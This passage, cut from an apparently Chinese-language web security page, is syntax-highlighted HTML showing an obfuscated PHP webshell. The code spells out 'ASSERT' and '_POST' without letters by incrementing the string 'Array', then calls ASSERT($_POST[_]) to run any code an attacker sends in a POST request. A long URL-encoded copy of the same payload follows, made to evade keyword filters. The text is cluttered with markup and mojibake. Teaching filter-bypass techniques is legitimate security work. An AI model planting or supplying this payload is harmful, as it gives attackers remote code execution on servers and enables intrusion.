number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">7</span>d<span class="token operator">%</span><span class="token number">5</span>b_<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">7</span>d<span class="token operator">%</span><span class="token number">5</span>b__<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">// $_='Array';</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// $_=$_[0];</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// A</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// E </span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// P</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// O</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ASSERT($_POST[_]);</span>urlç¼–ç åï¼š<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">!</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token 